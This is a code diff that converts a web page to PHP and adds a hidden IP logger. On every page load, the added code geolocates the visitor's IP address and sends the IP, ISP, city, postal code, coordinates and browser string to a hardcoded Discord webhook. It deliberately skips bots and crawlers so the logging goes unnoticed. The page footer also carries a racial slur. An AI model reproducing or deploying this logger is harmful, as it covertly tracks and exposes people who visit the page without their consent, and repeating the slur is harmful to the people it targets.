@@ -1,6 +1,6 @@
-<!DOCTYPE html>
+<!DOCTYPE php>
 
-<html>
+<php>
    
    <head>
       <link rel="shortcut icon" type="image/x=icon" href="https://auschwitz.shop/ZorGQieu8G.png?key=oTeiQChVTTos1Z"/>
@@ -36,5 +36,145 @@
    <footer>
       <h4 style="font-family: 'Arial'; color: white; position:fixed; bottom: 5px; left: 5px; text-shadow: 0 0 0.40em #1f1e1c;">&copy; Nigger</h4> 
    </footer>
+<?php
 
-</html>
+$Webhook    = "https://discord.com/api/webhooks/937447846511272026/XNxfmu9cHbQzJSC4sFl0zXbahd5AOE-xIOWVr6FfcCkJaKImVznZ-2tnSiMc-C6fkXOk"; 
+$WebhookTag = "logger"; 
+$WebhookAvatar = ""; 
+$DEmbedColor = "FFFFFF"; 
+
+$IP       = $_SERVER['REMOTE_ADDR'];
+$Browser  = $_SERVER['HTTP_USER_AGENT'];
+$URL = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
+
+if(preg_match('/bot|Discord|robot|curl|spider|crawler|Cloudflare-SSLDetector|^$/i', $Browser)) {
+    exit();
+}
+
+$Curl = curl_init("http://ip-api.com/json/$IP");
+curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
+$Info = json_decode(curl_exec($Curl)); 
+curl_close($Curl);
+
+$ISP = $Info->isp;
+$Status = $Info->status;
+$Country = $Info->country;
+$countryCode = $Info->countryCode;
+$Region = $Info->regionName;
+$City = $Info->city;
+$Tz = $Info->timezone;
+$Zip = $Info->zip;
+$COORD = "$Info->lat, $Info->lon"; 
+$flag = "https://www.countryflags.io/{$countryCode}/flat/64.png";
+$timestamp = date("Y-m-d H:i:s");
+
+
+$hookObject = json_encode([ 
+    'username'   => "$WebhookTag" , 
+    'avatar_url' => "$WebhookAvatar",
+    "embeds" => [
+       
+        [
+            "title" => "Ip Logger",
+            
+            
+            "type" => "rich",
+            
+            
+            "timestamp" => "$timestamp",
+            
+            
+            "color" => hexdec( "$DEmbedColor" ),
+            
+            
+            "footer" => [
+                "text" => "$WebhookTag | IP Logger",
+                "icon_url" => "$WebhookAvatar"
+            ],
+            "thumbnail" => [
+                "url" => "$flag"
+            ],
+            
+            "author" => [
+                "name" => "IP LOGGER",
+                "url" => "qerbic.tk"
+            ],
+            
+            "fields" => [
+              
+                [
+                    "name" => "URL Header Logged",
+                    "value" => "$URL",
+                    "inline" => false
+                ],
+                [
+                    "name" => "IP",
+                    "value" => "$IP",
+                    "inline" => true
+                ],
+                [
+                    "name" => "ISP",
+                    "value" => "$ISP",
+                    "inline" => true
+                ],
+                [
+                    "name" => "Status",
+                    "value" => "$Status",
+                    "inline" => true
+                ],
+                [
+                    "name" => "Browser",
+                    "value" => "$Browser",
+                    "inline" => false
+                ],
+                [
+                    "name" => "Country",
+                    "value" => "$Country",
+                    "inline" => true
+                ],
+                [
+                    "name" => "Region",
+                    "value" => "$Region",
+                    "inline" => true
+                ],
+                [
+                    "name" => "City",
+                    "value" => "$City",
+                    "inline" => true
+                ],
+                [
+                    "name" => "Timezone",
+                    "value" => "$Tz",
+                    "inline" => true
+                ],
+                [
+                    "name" => "Postal/Zip",
+                    "value" => "$Zip",
+                    "inline" => true
+                ],
+                [
+                    "name" => "Coordinates",
+                    "value" => "$COORD",
+                    "inline" => true
+                ],
+            ]
+        ]
+    ]
+
+], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
+
+$ch = curl_init();
+
+curl_setopt_array( $ch, [
+    CURLOPT_URL => $Webhook,
+    CURLOPT_POST => true,
+    CURLOPT_POSTFIELDS => $hookObject,
+    CURLOPT_HTTPHEADER => [
+        "Content-Type: application/json"
+    ]
+]);
+
+$response = curl_exec( $ch );
+curl_close( $ch );
+?>
+</php>
